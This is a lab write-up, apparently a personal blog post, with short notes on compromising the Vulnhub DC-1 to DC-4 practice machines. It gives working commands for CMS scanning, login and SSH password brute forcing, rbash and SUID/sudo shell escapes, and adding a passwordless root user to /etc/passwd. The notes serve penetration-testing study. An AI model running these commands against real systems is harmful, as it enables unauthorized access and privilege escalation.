---
title: "Vulnhub DC Series"
date: 2026-04-04 00:00:00 +0800
categories: [vulnhub]
tags: [vulhub]
platform: Vulhub
author: 0xmr
image: /assets/img/posts/vulnhub.webp
excerpt: "Vulnhub Hacking Boxes..."
---

## DC Series Learning...

# dc-1
```bash
# Exploiting CMS Drupal 7 using msf
# msf >  search about drupal 7 Exploits and Auxiliaries.
### Post Exploitation !
[SUID's Files ]:-
Awesome script for SUID Exploitation ====> suid3num.py <=====
find / -type f -perm -4000 2>/dev/null   ---> find

find . -exec /bin/sh -p \; -quit

# bling bling !!!
```

# dc-2
```bash
# Exploiting CMS --> Wordpress 4.7.10
# Password file creation ?
cewl $URL -m 5 -w $PWD/cewl.txt  2>/dev/null

# Login Brute force or userEnumeration...
wpscan --url $URL -e u -P cewl.txt

### Post Exploitation
=======================
[Escape rbash using vi]:- 
=======================
:set shell=/bin/bash
# type one more time this 
:shell  #then enter

export PATH=/bin:/usr/bin:$PATH
export SHELL=/bin/bash:$SHELL


### Post Exploitation !
===========================
Password Reuse and [sudo -l] :-
===========================
[/usr/bin/git  SUID Binary Escape]:-
sudo git help add
# Type this
!/bin/bash   #Enter it!

# bling bling !!!
```

# dc-3
```bash
# Exploiting Joomla 3.7.0 Version
 Explore msf usage for joomla exploitation , get used exploit and auxilaries
# Raw tool used for exploitation ?
- nmap
- joomlacheck.sh  <--- script
- nuclei   <--- for cve detection
=======
nuclei -u $URL -t /root/nuclei-templates/http/cves/ -tags joomla
=======
- dirsearch <--- for directory brute force
- git poc <--- for SQL Injection Exploitation
- curl 
- searchsploit 
- msfconsole  <-- A lot!

### Post Exploitation !
# Linux kernal Exploitation
------> linux kernal exploitation <-------
=> uname -a
=> file /bin/bash
=> cat /etc/*-release

# bling bling !!!
```

# dc-4
```bash
- Brute force login pages   --> ffuf , burp , caido 
   * ffuf -request req.txt -request-proto http -w /usr/share/wordlists/rockyou.txt -fs 206
- password brute force with --> medusa, hydra, nxc
   * hydra -l jim -P old_password.bak dc4 ssh
   * medusa -u jim -P old_password.bak -h dc4 -M ssh
   * nxc ssh dc4 -u 'jim' -p 'old_password.bak'
- Reading mails

### Post Exploitation !
[/usr/bin/teehee] sudo -l
#Creating root user privilleges user
echo "0xmr::0:0:::/bin/bash" | sudo teehee -a /etc/passwd  
su 0xmr

[learning here]
    ==> echo "0xmr:x:0:0:pwned user:/root:/bin/bash"
0xmr --> username
x --> password placeholder (replace [x] with [no space] for empty pass) => 0xmr::0:0:pwned user:/root:/bin/bash
0 --> UID=0
0 --> GID=0
pwned user --> User Discription
/root --> Home Directory of 0xmr
/bin/bash --> The login shell

# bling bling !!!
```
